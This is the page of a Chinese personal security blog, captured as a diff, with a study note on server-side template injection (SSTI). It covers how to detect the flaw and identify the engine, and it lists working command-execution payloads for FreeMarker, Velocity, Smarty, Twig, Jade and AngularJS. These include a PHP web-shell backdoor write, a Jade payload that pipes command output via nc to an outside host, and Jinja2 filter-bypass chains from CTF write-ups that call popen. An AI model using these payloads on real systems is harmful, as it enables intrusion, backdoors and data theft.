@@ -1,0 +1,474 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="SSTI服务端模板注入" />
+
+
+<meta name="description" content="今天学习一下SSTI-服务端模板注入。
+原理SSTI，服务端模板注入，既然是注入，那么其实也就类似HTML注入、SQL注入。服务端使用了模板引擎渲染用户的请求，用户的输入能够输出在页面中，并且没..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    SSTI服务端模板注入 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="SSTI服务端模板注入">
+            
+            SSTI服务端模板注入
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/SSTI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">SSTI服务端模板注入</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/07/19</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>今天学习一下SSTI-服务端模板注入。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SSTI，服务端模板注入，既然是注入，那么其实也就类似HTML注入、SQL注入。服务端使用了模板引擎渲染用户的请求，用户的输入能够输出在页面中，并且没有对用户的输入进行严格的过滤。</p>
+<p>模板引擎又分为客户端和服务端。</p>
+<ul>
+<li><p>客户端模板引擎</p>
+<table>
+<thead>
+<tr>
+<th align="center">模板引擎</th>
+<th align="center">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">常规字符串</td>
+<td align="center">doT.js、dust.js、mustache.js</td>
+</tr>
+<tr>
+<td align="center">DOM</td>
+<td align="center">vue.js、Angular.js、React.js</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>服务端模板引擎</p>
+<table>
+<thead>
+<tr>
+<th align="center">语言</th>
+<th align="center">例子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PHP</td>
+<td align="center">Smarty、Twig</td>
+</tr>
+<tr>
+<td align="center">Java</td>
+<td align="center">Freemarker、Velocity</td>
+</tr>
+<tr>
+<td align="center">Python</td>
+<td align="center">Jinja2、Tornado、Mardo</td>
+</tr>
+<tr>
+<td align="center">Ruby</td>
+<td align="center">Slim、ERB</td>
+</tr>
+<tr>
+<td align="center">NodeJS</td>
+<td align="center">Jade</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h2 id="各语言检测payload"><a href="#各语言检测payload" class="headerlink" title="各语言检测payload"></a>各语言检测payload</h2><p><img src="https://pic.downk.cc/item/5f14131114195aa594cfe0af.jpg" alt> </p>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>类似SQl注入加单引号检测，SSTI同样有简单的检测方法：</p>
+<p><code>?name=49</code></p>
+<p>传这样的参数进去，如果页面回显的是49，说明计算了7*7，因此存在SSTI。</p>
+<p>进一步测试：</p>
+<p><code>?name=ggy6OK</code></p>
+<p>页面回显ggy6OK。这是因为是注释，会被忽略。</p>
+<h2 id="判断是哪种模板引擎"><a href="#判断是哪种模板引擎" class="headerlink" title="判断是哪种模板引擎"></a>判断是哪种模板引擎</h2><p>使用<code>49</code>，返回49的是Twig, 返回7777777的是Jinja2。</p>
+<p>其它未知。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="FreeMarker"><a href="#FreeMarker" class="headerlink" title="FreeMarker"></a>FreeMarker</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assigntest&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assignob&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;</span><br></pre></td></tr></table></figure>
+
+<p>创建模板时新建一个实例，后续调用会使得命令执行。</p>
+<h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;sleep 5&quot;).wairFor()</span><br></pre></td></tr></table></figure>
+
+<p>sleep 5为命令，可换成其它命令。</p>
+<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 任意读取文件</span><br><span class="line">&#123;self:getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br><span class="line">2. 写文件创建后门</span><br><span class="line">&#123;Smarty_Internal_write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache&#123;&quot;ftp:&#x2F;&#x2F;xxx:2121&quot;&#125;&#125;&#125;&#123;&#123;_self.env.loadTemplate&#123;&quot;backdoor&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>setCache能改变Twig加载PHP文件的路径，因此可以RFI。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback&#123;&quot;exec&quot;&#125;&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>getFilter里有危险函数call_user_func,通过传递的参数可以任意调用PHP函数，注册exec为filter的回调函数即可命令执行。</p>
+<h3 id="Jade"><a href="#Jade" class="headerlink" title="Jade"></a>Jade</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- var x&#x3D;root.process</span><br><span class="line">- x&#x3D;x.mainModule.require</span><br><span class="line">- x&#x3D;x&#123;&#39;child_process&#39;&#125;</span><br><span class="line">&#x3D; x.exec&#123;&#39;id|nc xxx.net:80&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h3><p><strong>payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">	&#123;&#123;a&#x3D;toString().constructor.prototype;a.charAt&#x3D;a.trim;$eval(&#39;a,alert(1),a&#39;)&#125;&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
+
+<p>读取HTML，并将页面的输入或输出绑定JS变量表示的模型。</p>
+<h2 id="检测工具"><a href="#检测工具" class="headerlink" title="检测工具"></a>检测工具</h2><p>tplmap: <a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p>
+<h2 id="Flask-SSTI-及绕过姿势"><a href="#Flask-SSTI-及绕过姿势" class="headerlink" title="Flask SSTI 及绕过姿势"></a>Flask SSTI 及绕过姿势</h2><p>重点看这篇文章：<a href="https://zhuanlan.zhihu.com/p/93746437?utm_source=wechat_session" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/93746437?utm_source=wechat_session</a></p>
+<h2 id="CTF题目"><a href="#CTF题目" class="headerlink" title="CTF题目"></a>CTF题目</h2><p><img src="https://pic.downk.cc/item/5f1416b914195aa594d0ae81.png" alt>  </p>
+<p><a href="http://47.102.199.155:8000/" target="_blank" rel="noopener">Normal SSTI</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1. 使用 ?name&#x3D;&#123;&#123;2*3&#125;&#125; ，页面返回Hello 6, 存在SSTI。</span><br><span class="line"></span><br><span class="line">2. ?name&#x3D;&#123;&#123;[].__class__&#125;&#125; ，获取类名。</span><br><span class="line"></span><br><span class="line">3. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0]&#125;&#125;, 获取父类名Object。Java的所有类都是继承自Object。</span><br><span class="line"></span><br><span class="line">4. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;, 获取Object类下的所有子类。</span><br><span class="line"></span><br><span class="line">5. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[0]&#125;&#125;, 调用第一个类，可修改[0]调用其它类。</span><br><span class="line"></span><br><span class="line">6. 需要使用os._wrap_close类，因为这个类有个popen方法。因此需要知道这个类在Object的子类中位于哪个位置。此时可以使用burp的intruder模块。</span><br><span class="line"></span><br><span class="line">   ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[$0$]&#125;&#125;, 对这个0打上标签，然后payload中选择Number, 填上范围数字。在Options的Grep-Match中添加&#39;os.wrap_close&#39;，（要用引号）点击Add,进行攻击。得到位于117位置。</span><br><span class="line"></span><br><span class="line">7. ?name&#x3D;&#123;&#123;[].__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&#39;cat+&#x2F;flag&#39;).read()&#125;&#125;, 也可以换成其它命令如：ls &#x2F;等进行RCE。</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://47.102.199.155:8100/" target="_blank" rel="noopener">强网杯2019</a>。</p>
+<p><img src="https://pic.downk.cc/item/5f1415b414195aa594d07acc.png" alt> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)&#125;&#125;&amp;cla&#x3D;__class__	&#x2F;&#x2F;得到类名</span><br><span class="line"></span><br><span class="line">?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__			&#x2F;&#x2F;得到父类名</span><br><span class="line"></span><br><span class="line">?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__		</span><br><span class="line">&#x2F;&#x2F;得到所有类名</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;要选择哪个魔术方法，不能用[0]或者(0)这样, 需要传getitem进去。</span><br><span class="line">?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.item)(0)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;item&#x3D;__getitem__			&#x2F;&#x2F;获得第一个子类</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用burp进行寻找os._wrap_close的位置。得到127。然后初始化global</span><br><span class="line">?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.item)(127)|attr(request.args.init)|attr(request.args.glo)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;item&#x3D;__getitem__&amp;init&#x3D;__init__&amp;glo&#x3D;__globals__</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;使用getitem调用popen函数，再通过read读取。得到最终payload：</span><br><span class="line">?data&#x3D;&#123;&#123;&quot;&quot;|attr(request.args.cla)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.item)(127)|attr(request.args.init)|attr(request.args.glo)|attr(request.item)(&#39;popen&#39;)(&#39;whoami&#39;)|attr(request.args.re)&#125;&#125;&amp;cla&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;item&#x3D;__getitem__&amp;init&#x3D;__init__&amp;glo&#x3D;__globals__&amp;re&#x3D;read</span><br><span class="line">&#x2F;&#x2F;即可得到whoami的结果。</span><br></pre></td></tr></table></figure>
+
+<p>JustCTF2019</p>
+<p>没有链接…</p>
+<p>该题适用于日常的渗透测试。用户的输入输出在了页面，通常我们只会去测试明显的那个输入位置。比如：输入了<code>firstname=ggy&amp;secondname=666</code>,</p>
+<p>页面输出了<code>hello, ggy</code>。通常只会测试fistname看有没有漏洞。但是后面还有一个参数：<code>firstname=ggy&amp;secondname=666&amp;type=acam.victim.fistname</code>, 前面的fistname不存在漏洞，但是后面的type中的fistname存在。我们发现这个值的格式是：<code>xxx.xxx.xxx</code>，跟SSTI的payload格式一样，只不过很可能它们已经是类名、方法名了。那么可进行测试：</p>
+<p><code>type=acam.victim.2</code></p>
+<p>页面返回2.说明存在漏洞。要想像前面的题目一样利用，得知道firstname所在的位置是一个类还是一个方法。那么可以这样：</p>
+<p><code>type=acam.victim.to_dict</code></p>
+<p>发现victim是一个方法了，之后就是获取全局变量了。</p>
+<p><code>type=acam.victim.to_dict.__globals__</code></p>
+<p>页面查找flag即可。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1516336" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516336</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/07/20/LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="pre-post btn btn-default" title='LDAP注入漏洞总结'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            LDAP注入漏洞总结</span>
+    </a>
+    
+    
+    <a href="/2020/07/18/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="next-post btn btn-default" title='CRLF注入漏洞总结'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            CRLF注入漏洞总结</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#各语言检测payload"><span class="toc-text">各语言检测payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测"><span class="toc-text">检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是哪种模板引擎"><span class="toc-text">判断是哪种模板引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeMarker"><span class="toc-text">FreeMarker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Velocity"><span class="toc-text">Velocity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig"><span class="toc-text">Twig</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jade"><span class="toc-text">Jade</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS"><span class="toc-text">AngularJS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#检测工具"><span class="toc-text">检测工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask-SSTI-及绕过姿势"><span class="toc-text">Flask SSTI 及绕过姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF题目"><span class="toc-text">CTF题目</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
